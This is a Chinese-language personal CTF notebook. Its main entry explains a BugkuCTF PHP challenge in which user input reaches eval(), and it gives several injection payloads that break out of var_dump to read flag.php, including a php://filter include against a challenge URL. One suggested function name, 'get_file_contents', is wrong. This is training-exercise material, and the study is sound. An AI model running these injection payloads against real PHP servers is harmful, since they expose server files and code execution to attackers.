# CTF记录
---
开始时间 2019/10/17
## 示例类型
  ### 示例题目1 [xxxx(Doing), xxxxxx(Stuck)]
  思路什么的写在这里
  ```
  代码什么的贴在这里
  ```
  
  ### 示例题目2 [Solved][xxxxxx(Doing)]
  ```
  FLAG: flag{this_is_flag}
  ```
  思路什么的写在这里
  记得添点图片
  
  
------------
## hackergame 2019
### 信息安全2077
haha 第一题我就🕊了，不愧是我

## bugkuctf
### web4
打开之后看源码，1.是post，2.如果a不为undefined而且为67d709b2b54aa2aa648cf6e87a7114f1就返回！0，即真

--------
### 文件包含漏洞
#### 本地包含
进去后看到如下代码
 <?php
    include "flag.php";
    $a = @$_REQUEST['hello'];
    eval( "var_dump($a);");
    show_source(__FILE__);
?> 
代码解释：

a、include "flag.php" 他居然把我们想要的flag包含进来了，真是嘿嘿嘿嘿

b、$_request这个变量和$_GET、$_POST一样，都属于超级全局变量，但是呢，运行时修改后者不会影响前者，反之亦然

c、以get/post/cookies等方式把以hello为名的东西提交过来

d、eval函数把字符串当作命令直接执行

e、最后一句把本页代码以高亮语法显示出来

###### 解法1.利用eval
可以构造payload，有点像数据库注入 hello=1);show_source(%27flag.php%27);var_dump(3 把这个带到eval( "var_dump($a);");中就是
eval( "var_dump(1);show_source(%27flag.php%27);var_dump(3);");拆分成执行三条语句了 %27为单引号的ASCII
###### 解法2.直接将flag.php文件读入变量hello中

?hello=get_file_contents('flag.php')或
?hello=file('flag.php')
###### 解法3.利用php://filter + eval
http://120.24.86.145:8003/index.php?hello=1);include $_POST['f'];//  （把后面的括号注释掉）
在POST区域：f=php://filter/convert.base64-encode/resource=flag.php?
得到的结果base64解码即可 这个不懂可看下面的php：//filter妙用的链接
试着试着就崩了只用第1种得到了flag。。。

命令执行漏洞学习总结 https://www.jianshu.com/p/bf64c59b64e6
BugkuCTF-web-本地包含 https://blog.csdn.net/huangming1644/article/details/82818482
谈一谈php://filter的妙用 https://www.leavesongs.com/PENETRATION/php-filter-magic.html
